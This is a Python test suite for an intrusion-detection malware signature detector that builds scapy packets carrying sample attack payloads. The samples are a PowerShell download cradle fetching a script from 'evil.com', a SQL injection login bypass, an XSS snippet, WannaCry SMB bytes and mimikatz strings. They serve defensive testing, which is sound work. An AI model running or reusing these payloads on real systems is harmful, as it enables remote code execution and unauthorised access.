"""Test suite for MalwareDetector"""

from datetime import datetime
from scapy.layers.inet import IP, TCP, UDP
from scapy.packet import Raw

from ids.detectors.malware_detector import MalwareDetector
from ids.models.data_models import ThreatType


def test_malware_detector_initialization():
    """Test that MalwareDetector initializes with signatures"""
    detector = MalwareDetector()
    
    # Should have loaded signatures
    assert detector.get_signature_count() > 0
    print(f"✓ Detector initialized with {detector.get_signature_count()} signatures")


def test_detect_wannacry_signature():
    """Test detection of WannaCry SMB exploit pattern"""
    detector = MalwareDetector()
    
    # Create packet with WannaCry signature
    payload = b"\x00\x00\x00\x31\xff\x53\x4d\x42" + b"additional data"
    packet = IP(src="192.168.1.100", dst="10.0.0.5") / TCP(dport=445) / Raw(load=payload)
    
    threat = detector.detect(packet)
    
    assert threat is not None
    assert threat.threat_type == ThreatType.MALWARE
    assert threat.source_ip == "192.168.1.100"
    assert threat.destination_ip == "10.0.0.5"
    assert threat.protocol == "TCP"
    assert threat.raw_data["signature_count"] >= 1
    assert any("wannacry" in sig["name"] for sig in threat.raw_data["detected_signatures"])
    print("✓ WannaCry signature detected correctly")


def test_detect_powershell_download():
    """Test detection of PowerShell download cradle"""
    detector = MalwareDetector()
    
    # Create packet with PowerShell download pattern
    payload = b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
    packet = IP(src="192.168.1.50", dst="10.0.0.10") / TCP(dport=80) / Raw(load=payload)
    
    threat = detector.detect(packet)
    
    assert threat is not None
    assert threat.threat_type == ThreatType.MALWARE
    assert threat.source_ip == "192.168.1.50"
    assert "powershell_download" in [sig["name"] for sig in threat.raw_data["detected_signatures"]]
    print("✓ PowerShell download cradle detected correctly")


def test_detect_sql_injection():
    """Test detection of SQL injection attempt"""
    detector = MalwareDetector()
    
    # Create packet with SQL injection pattern
    payload = b"username=' OR '1'='1&password=anything"
    packet = IP(src="192.168.1.75", dst="10.0.0.20") / TCP(dport=3306) / Raw(load=payload)
    
    threat = detector.detect(packet)
    
    assert threat is not None
    assert threat.threat_type == ThreatType.MALWARE
    assert "sql_injection" in [sig["name"] for sig in threat.raw_data["detected_signatures"]]
    print("✓ SQL injection attempt detected correctly")


def test_detect_multiple_signatures():
    """Test detection of multiple malware signatures in one packet"""
    detector = MalwareDetector()
    
    # Create packet with multiple malicious patterns
    payload = b"mimikatz tool used with powershell -enc base64data"
    packet = IP(src="192.168.1.200", dst="10.0.0.30") / TCP(dport=445) / Raw(load=payload)
    
    threat = detector.detect(packet)
    
    assert threat is not None
    assert threat.raw_data["signature_count"] >= 2
    sig_names = [sig["name"] for sig in threat.raw_data["detected_signatures"]]
    assert "mimikatz" in sig_names
    assert "base64_powershell" in sig_names
    print(f"✓ Multiple signatures detected: {threat.raw_data['signature_count']}")


def test_no_detection_clean_packet():
    """Test that clean packets don't trigger false positives"""
    detector = MalwareDetector()
    
    # Create packet with benign payload
    payload = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n"
    packet = IP(src="192.168.1.10", dst="10.0.0.5") / TCP(dport=80) / Raw(load=payload)
    
    threat = detector.detect(packet)
    
    assert threat is None
    print("✓ Clean packet not flagged as malware")


def test_no_detection_no_payload():
    """Test that packets without payload don't cause errors"""
    detector = MalwareDetector()
    
    # Create packet without payload
    packet = IP(src="192.168.1.10", dst="10.0.0.5") / TCP(dport=80)
    
    threat = detector.detect(packet)
    
    assert threat is None
    print("✓ Packet without payload handled correctly")


def test_udp_packet_detection():
    """Test malware detection in UDP packets"""
    detector = MalwareDetector()
    
    # Create UDP packet with malicious payload
    payload = b"metasploit payload data"
    packet = IP(src="192.168.1.150", dst="10.0.0.40") / UDP(dport=53) / Raw(load=payload)
    
    threat = detector.detect(packet)
    
    assert threat is not None
    assert threat.protocol == "UDP"
    assert "metasploit_payload" in [sig["name"] for sig in threat.raw_data["detected_signatures"]]
    print("✓ Malware detected in UDP packet")


def test_case_insensitive_detection():
    """Test that detection is case-insensitive"""
    detector = MalwareDetector()
    
    # Create packet with uppercase pattern
    payload = b"MIMIKATZ tool detected"
    packet = IP(src="192.168.1.100", dst="10.0.0.5") / TCP(dport=445) / Raw(load=payload)
    
    threat = detector.detect(packet)
    
    assert threat is not None
    assert "mimikatz" in [sig["name"] for sig in threat.raw_data["detected_signatures"]]
    print("✓ Case-insensitive detection works")


def test_add_custom_signature():
    """Test adding custom signatures"""
    detector = MalwareDetector()
    
    initial_count = detector.get_signature_count()
    
    # Add custom signature
    detector.add_signature(
        name="custom_malware",
        pattern=b"custom_pattern",
        description="Custom test malware",
        severity_hint="high"
    )
    
    assert detector.get_signature_count() == initial_count + 1
    
    # Test detection with custom signature
    payload = b"This contains custom_pattern in the data"
    packet = IP(src="192.168.1.100", dst="10.0.0.5") / TCP(dport=80) / Raw(load=payload)
    
    threat = detector.detect(packet)
    
    assert threat is not None
    assert "custom_malware" in [sig["name"] for sig in threat.raw_data["detected_signatures"]]
    print("✓ Custom signature added and detected")


def test_remove_signature():
    """Test removing signatures"""
    detector = MalwareDetector()
    
    # Add a signature
    detector.add_signature(
        name="temp_signature",
        pattern=b"temp_pattern",
        description="Temporary signature",
        severity_hint="low"
    )
    
    # Remove it
    result = detector.remove_signature("temp_signature")
    assert result is True
    
    # Try to remove non-existent signature
    result = detector.remove_signature("non_existent")
    assert result is False
    print("✓ Signature removal works correctly")


def test_severity_hint_extraction():
    """Test that highest severity hint is extracted correctly"""
    detector = MalwareDetector()
    
    # Create packet with multiple signatures of different severities
    payload = b"mimikatz and <script>alert(1)</script>"
    packet = IP(src="192.168.1.100", dst="10.0.0.5") / TCP(dport=80) / Raw(load=payload)
    
    threat = detector.detect(packet)
    
    assert threat is not None
    # Should pick "critical" from mimikatz over "medium" from XSS
    assert threat.raw_data["severity_hint"] == "critical"
    print("✓ Highest severity hint extracted correctly")


def test_payload_preview():
    """Test payload preview generation"""
    detector = MalwareDetector()
    
    # Create packet with long payload
    payload = b"mimikatz " + b"A" * 200
    packet = IP(src="192.168.1.100", dst="10.0.0.5") / TCP(dport=445) / Raw(load=payload)
    
    threat = detector.detect(packet)
    
    assert threat is not None
    assert "payload_preview" in threat.raw_data
    # Preview should be truncated
    assert len(threat.raw_data["payload_preview"]) <= 103  # 100 + "..."
    print("✓ Payload preview generated correctly")


if __name__ == "__main__":
    print("Running MalwareDetector tests...\n")
    
    test_malware_detector_initialization()
    test_detect_wannacry_signature()
    test_detect_powershell_download()
    test_detect_sql_injection()
    test_detect_multiple_signatures()
    test_no_detection_clean_packet()
    test_no_detection_no_payload()
    test_udp_packet_detection()
    test_case_insensitive_detection()
    test_add_custom_signature()
    test_remove_signature()
    test_severity_hint_extraction()
    test_payload_preview()
    
    print("\n✅ All MalwareDetector tests passed!")
